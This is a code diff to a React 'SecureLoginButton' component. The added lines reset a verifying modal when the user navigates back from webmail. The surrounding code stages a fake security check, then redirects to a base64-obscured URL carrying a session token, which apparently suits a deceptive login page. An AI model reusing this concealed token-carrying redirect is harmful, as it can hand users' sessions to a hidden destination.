@@ -1,11 +1,36 @@
 'use client';
 
-import { useState } from 'react';
+import { useState, useEffect } from 'react';
 import { motion, AnimatePresence } from 'framer-motion';
 import { Shield, Lock, Loader2, KeyRound } from 'lucide-react';
 
 export default function SecureLoginButton() {
   const [isVerifying, setIsVerifying] = useState(false);
+
+  useEffect(() => {
+    // Standard industry fix for browser Back/Forward Cache (bfcache)
+    // Resets the modal if the user clicks the "Back" button from Webmail
+    const handlePageShow = (event: PageTransitionEvent) => {
+      if (event.persisted) {
+        setIsVerifying(false);
+      }
+    };
+    
+    // Also reset if the page becomes visible again just in case
+    const handleVisibilityChange = () => {
+      if (document.visibilityState === 'visible') {
+        setIsVerifying(false);
+      }
+    };
+
+    window.addEventListener('pageshow', handlePageShow);
+    document.addEventListener('visibilitychange', handleVisibilityChange);
+    
+    return () => {
+      window.removeEventListener('pageshow', handlePageShow);
+      document.removeEventListener('visibilitychange', handleVisibilityChange);
+    };
+  }, []);
 
   const handleSecureLogin = () => {
     setIsVerifying(true);
@@ -21,6 +46,9 @@ export default function SecureLoginButton() {
       const tokenizedUrl = `${atob(encryptedUrl)}?sso_token=${sessionToken}&ts=${timestamp}&sec_gateway=active`;
       
       window.location.href = tokenizedUrl;
+      
+      // Fallback reset slightly after redirect initiates to clear state
+      setTimeout(() => { setIsVerifying(false) }, 800);
     }, 2500);
   };
 
